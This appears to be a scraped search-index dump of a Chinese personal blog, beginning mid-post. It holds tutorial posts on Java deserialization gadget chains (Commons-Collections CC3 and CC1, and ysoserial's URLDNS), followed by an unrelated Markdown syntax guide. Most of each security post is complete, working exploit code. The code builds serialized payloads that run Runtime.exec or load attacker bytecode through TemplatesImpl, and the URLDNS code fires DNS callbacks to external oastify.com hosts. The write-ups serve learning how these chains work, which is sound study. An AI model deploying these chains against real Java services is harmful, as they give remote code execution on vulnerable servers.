codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(templates); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); // proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); CC6 链的 TemplatesImpl 的实现方式 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null,null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,\u0026#34;abc\u0026#34;); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); lazymap.remove(\u0026#34;abc\u0026#34;); Class c = LazyMap.class; Field factoryfield = c.getDeclaredField(\u0026#34;factory\u0026#34;); factoryfield.setAccessible(true); factoryfield.set(lazymap,chainedTransformer); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 回到cc3链 目前是到了newTransformer,继续找谁调用了newTransformer\n这里主要是找到了四个，我们一个个讲解一下为什么是 TrAXFilter 而不是其他的。 Process 这个在 main 里面，是作为一般对象用的，所以不用它。\n第二个 getOutProperties，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。\nTransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。\n最后，TrAXFilter，它也是不能序列化的，但是我们去到它的构造函数看，是有搞头的。\n只需要调用TrAXFilter的构造函数就行了\nCC3 这里的作者没有调用InvokerTransformer，而是调用了一个新的类 InstantiateTransformer。\nInstantiateTransformer 这个类是用来初始化 Transformer 的，我们去找 InstantiateTransformer 类下的 transform 方法。 完美契合我们的需求！\n写exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); instantiateTransformer.transform(trAXFilter); 弹计算器\n找transform找到熟悉的LazyMap函数\n想到cc1的正链\n直接把前半部分的链拿来用\n序列化正常,但是反序列化报错\n想起之前的\nsetValue传参无法可控\n所以这里还需要借助ConstantTransformer和ChainedTransformer\n1 2 3 4 Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); // proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); // serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); 成功弹计算器\n流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() ProxyMap.entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() InstantiateTransformer.transform() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:25+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9_hu85212b583738171f073e269c79fb2d2a_215178_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/","title":"java反序列化之Commons-Collections-CC3链"},{"content":"链尾InvokerTransformer.transform 存在invoke,执行危险函数\n1 2 3 4 5 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method.invoke(runtime,\u0026#34;calc\u0026#34;); 和runtime通过反射弹计算器很像,而且参数都可控 一一对应,调用transform()方法将Runtime对象传入,相当于反射了执行exec危险函数\n1 2 3 4 5 6 7 8 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; //Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); //method.invoke(runtime,\u0026#34;calc\u0026#34;); //以上是runtime的弹计算器操作 //public构造方法,无需反射 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); invokerTransformer.transform(runtime); 找到链尾,继续找transform的同方法不同调用类\nTransformedMap.checkValue()触发transformer 圈的就是还是同样的transformer类的transform方法\n下划线的就是新的类的transform方法\n其中 TransformedMap 类中存在 checkSetValue() 方法调用了 transform() 方法。\n接下来我们去看一看 valueTransformer.checkSetValue 的 valueTransformer 是什么东西，最终在 TransformedMap 的构造函数中发现了 valueTransformer\n因为 TransformedMap 的构造方法作用域是 protected，我们还需要去找一找谁调用了 TransformedMap 的构造方法。 在 decorate() 静态方法中创建了 TransformedMap 对象\nInvokerTransformer继承了Transformer,所以decorate(Transformer valueTransformer)能传入InvokerTransformer对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; //Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); //method.invoke(runtime,\u0026#34;calc\u0026#34;); //以上是runtime的弹计算器操作 //public构造方法,无需反射 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); invokerTransformer.transform(runtime); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); //protected构造方法,decorate静态方法能返回一个TransformedMap对象 Map decoratemap = TransformedMap.decorate(map,null,invokerTransformer); //protected checkSetValue 要通过反射 Class\u0026lt;TransformedMap\u0026gt; transformedMapClass = TransformedMap.class; Method method = transformedMapClass.getDeclaredMethod(\u0026#34;checkSetValue\u0026#34;, Object.class); method.setAccessible(true); method.invoke(decoratemap,runtime); 成功弹计算器\n继续找调用checkSetValue的不同类\nAbstractInputCheckedMapDecorator.setValue触发checkSetValue 所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue\n遍历调用checkSetValue的原理 1 2 3 4 for(Map.Entry entry:decoratemap.entrySet()) { entry.setValue(runtime); } AbstractInputCheckedMapDecorator的entrySet函数\nisSetValueChecking()默认为真,返回一个EntrySet的类\nthis是指当前实例,也就是TransformedMap\n此时参数(map.entrySet(),TransformedMap)\nmap.entrySet()返回由Map.Entry组成的原始集合\n在EntrySet类中，迭代器使用了EntrySetInterator进行迭代\n重写了迭代中会使用的next()，在这里就返回了MapEntry装饰的Map.Entry\n从而调用\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;MapEntry类的setValue()函数\u0026lt;/font\u0026gt;\n开断点运行的流程\n增强for循环工作原理如下：\n获取迭代器：调用集合对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;iterator()\u0026lt;/font\u0026gt; 方法，获取一个 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象。\n检查是否有下一个元素：调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 方法，检查是否有下一个元素。\n获取下一个元素：如果 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 返回 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;true\u0026lt;/font\u0026gt;，则调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法，获取下一个元素。\n执行循环体：将获取的元素赋值给循环变量，并执行循环体。\n这意味着每次循环实际上是在使用迭代器遍历集合。\n即遍历调用setValue背后的详细步骤如下：\n获取迭代器：增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;transformedMap.entrySet().iterator()\u0026lt;/font\u0026gt;，获取 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象。 检查是否有下一个元素：增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 方法。 获取下一个元素：如果 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 返回 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;true\u0026lt;/font\u0026gt;，增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法。 执行循环体：将 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法返回的元素赋值给 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;entry\u0026lt;/font\u0026gt; 变量，然后执行循环体中的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;entry.setValue(Runtime.class)\u0026lt;/font\u0026gt;。\u0026lt;font style=\u0026quot;color:rgb(39, 56, 73);\u0026quot;\u0026gt;parent早就是TransformedMap\u0026lt;/font\u0026gt;,所以自然会调用 \u0026lt;font style=\u0026quot;color:rgb(39, 56, 73);\u0026quot;\u0026gt;TransformedMap.checkSetValue\u0026lt;/font\u0026gt;\n1 2 3 4 5 6 7 8 9 10 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;123\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,invokerTransformer); for(Map.Entry entry:decoratemap.entrySet()) { entry.setValue(runtime); } 成功弹计算器了\n找readObject 找调用setValue的readObject入口类\n这里的for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())\n和for(Map.Entry entry:decoratemap.entrySet())可以发现是一样的,只不过参数名称不同,\n所以memberValues需要被赋值为TransformedMap\n没有修饰符,说明不能直接new,要通过反射\n1 2 3 4 Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Override.class,decoratemap); 理想状况下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import java.util.Map; public class cc1Test { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;123\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,invokerTransformer); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Override.class,decoratemap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 但是还有三个问题要解决\n1.Runtime对象不可序列化,需要通过反射将其变成可以序列化的形式。\n2.setValue() 的传参，是需要传 Runtime 对象的；而在实际情况当中的 setValue() 的传参是这个东西\n3.解决上文提到的，要进入 setValue 的两个 if 判断\n解决问题 1.Runtime不能序列化 Runtime 是不能序列化的，但是 Runtime.class 是可以序列化的。\n1 2 3 4 Runtime r = Runtime.getRuntime(); Class c = Runtime.class; Method method = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method.invoke(r,\u0026#34;calc\u0026#34;); 对\u0026lt;font style=\u0026quot;color:rgb(80, 80, 92);\u0026quot;\u0026gt;getRuntime()\u0026lt;/font\u0026gt;也反射\n1 2 3 4 5 6 7 Class c = Runtime.class; Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;); //getRuntime没有参数 Object object =(Runtime) method.invoke(null,null); //这里相当于调用静态方法getRuntime,返回Runtime实例 Method method1 = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(object,\u0026#34;calc\u0026#34;); 2.解决两个if条件 第一个if\n打印一下就知道了\n所以name就是键名\nget是获取键名name的键值\nAnnotationInvocationHandler的readObject内的\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name);\u0026lt;/font\u0026gt;做了什么呢？就是取出注解类中为name的方法名。\n因为先给的\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;Override\u0026lt;/font\u0026gt;没有方法,所以\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;memberType\u0026lt;/font\u0026gt;为null\n但是Target有value方法,所以给如果name为value,\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;memberType\u0026lt;/font\u0026gt;就为真\n1 2 hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Object o = annotationclz.newInstance(Target.class,decoratemap); debug能进入下面的代码\n第二个if\n调试的时候,已经给出value的值是键值了,这个if判断就是判断value是不是memberType 的实例，或者ExceptionProxy 的实例，不是就执行 if 语句块中的代码\n这里put传键值随便传个123\n3.解决setValue() 的传参 这里用到了ChainedTransformer\ntransform方法就是个反射的代码\n所以不需要写那么多反射,这里直接每次都调用transform来反射\n构造方法能看到传入的是Transformer数组\n1 2 3 4 5 6 7 Transformer[] transformers = { new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;getRuntime\u0026#34;}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object.class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); 不是很看的懂\n1 2 3 4 5 6 7 相当于把这些操作都揉和了 Class c = Runtime.class; Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;); Object object =(Runtime) method.invoke(null,null); Method method1 = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(object,\u0026#34;calc\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); 这里应该要传入TransformedMap的,但是限死了\n看报错看得出来\nConstantTransformer类也有个transform方法,而且只会返回他固定的值\n构造方法也简单,只需要传入一个类,这里传入Runtime.class\n完整poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,chainedTransformer); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Target.class,decoratemap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); 链子\n1 2 3 4 5 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ","date":"2025-01-03T15:12:32+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1/6_hud69a7055820c9b61848b93fca47d389b_274875_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1/","title":"java反序列化之Commons-Collections1-CC1链"},{"content":"这是ysoserial的URLDNS链\n首先选择HashMap,这里首先满足了继承Serializable\n再寻找source,找到重写的readObject\nKey 与 Value 的值执行了\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);\u0026quot;\u0026gt;readObject\u0026lt;/font\u0026gt;的操作，再将 Key 和 Value 两个变量扔进\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);\u0026quot;\u0026gt;hash\u0026lt;/font\u0026gt;这个方法里，我们再跟进(ctrl+鼠标左键即可) hash 当中\n如果传入的key不为null,则进入hashCode方法,跟进hashCode方法\n是Object类的方法,满足调用常见的函数\n原理 URL是hashMap的put方法产生的\nput调用hash方法,参数为key\n这里再调用key的hashCode方法\nHashMap到URL共有的hashCode方法,从而链接到一起\n1 2 3 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); hashmap.put(new URL(\u0026#34;DNS请求\u0026#34;),1); key就是URL的类 跟进URL,因为key.hashCode(),key又是new URL,所以这里会调用URL的hashCode方法\n发现是handler调用了hashCode方法,继续跟进\n跟进到URLStreamHandler类,寻找hashCode方法\nInetAddress addr = getHostAddress(u);对u进行了操作,跟进\ngetHostAddress\n这里就是对域名解析,然后可以检测DNS是否查询来判断反序列化漏洞\n利用 1 2 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); hashmap.put(new URL(\u0026#34;http://ylnjtzpu0nc2fpf8pskzf64kgbm2a4yt.oastify.com\u0026#34;),1); 运行序列化后,发现触发了DNS查询\n跟进URL的hashCode的\nhashCode一开始就是-1,所以会直接执行handler.hashCode从而触发DNS查询,这样会混淆是否是反序列化的时候触发\n所以需要再序列化的时候将hashCode的值改为不是-1的值\n因为hashCode是私有属性,需要通过反射来修改\n1 2 3 4 5 6 7 8 9 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); URL url = new URL(\u0026#34;http://g9q1hhdco50k373qda8h3os24takybqzf.oastify.com\u0026#34;); Class c =url.getClass(); Field hashcode = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcode.setAccessible(true); hashcode.set(url,123); hashmap.put(url,1); hashcode.set(url,-1); 通过反射修改后就不会出现上面的情况了\n","date":"2025-01-03T15:04:23+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/urldns/5_hu9be65c565c9573e11671b93a8e49cd18_347308_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/urldns/","title":"java反序列化之URLDNS链"},{"content":" Markdown 基本语法 | Markdown 教程\n标题语法 **#**数量代表标题级别\n#:一级\n##:二级\n强调语法 粗体 在单词或短语的前后各添加两个星号或下划线\n**a** -\u0026gt; a\nhello w**or**ld -\u0026gt; hello world\n斜体 在单词或短语前后添加一个星号或下划线\n*a* -\u0026gt; a\nw*or*ld -\u0026gt; world\n引用语法 块引用 段落前添加一个 \u0026gt; 符号\n\u0026gt; hello world\nhello world\n多段块引用enter就好了\n嵌套块引用 块引用可以嵌套。在要嵌套的段落前添加一个 \u0026gt;\u0026gt; 符号\nhello world\nhello wold\nhello world\n带有其它元素的块引用 块引用可以包含其他 Markdown 格式的元素\n一级 hello\nworld\nhello world !\n列表语法 有序列表 要创建有序列表，请在每个列表项前添加数字并紧跟一个英文句点。数字不必按数学顺序排列，但是列表应当以数字 1 起始。\nFirst\nSecond\nThird\n无序列表 要创建无序列表，请在每个列表项前面添加破折号 (-)、星号 (*) 或加号 (+) 。缩进一个或多个列表项可创建嵌套列表。\n- first\nfirst * second\nsecond + third\nthird 代码语法 将单词或短语表示为代码，请将其包裹在反引号 (\\) 中。\n`hello world` -\u0026gt; hello world\n转义反引号 如果你要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号(````)中。\n``hello `world`` -\u0026gt; hello `world\n代码块 在代码块之前和之后的行上使用三个反引号(`````）或三个波浪号（~~~）\n1 2 3 hello world ! 分割线语法 要创建分隔线，请在单独一行上使用三个或多个星号 (***)、破折号 (---) 或下划线 (___) ，并且不能包含其他内容。\n链接语法 链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。\n超链接Markdown语法代码：[超链接显示名](超链接地址 \u0026quot;超链接title\u0026quot;)\n一个俗人的博客\n给链接增加 Title 链接title是当鼠标悬停在链接上时会出现的文字\n一个俗人的博客\n网址和Email地址 使用尖括号可以很方便地把URL或者email地址变成可点击的链接。\nhttps://gsygsr.github.io/\n带格式化的链接 点击访问原神**原神**\n图片语法 插入图片Markdown语法代码：![图片alt](图片链接 \u0026quot;图片title\u0026quot;)\n链接图片 给图片增加链接，请将图像的Markdown 括在方括号中，然后将链接添加在圆括号中。\n[![点击访问博客](4.jpg \u0026quot;点击访问博客\u0026quot;)](https://gsygsr.github.io)\n","date":"2024-12-31T15:27:48+08:00","image":"https://gsygsr.github.io/dajian/markdown/1_hu3963ffc2b11462ca836321861c385f3c_182481_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/dajian/markdown/","title":"Markdown"},{"content":"博客搭建 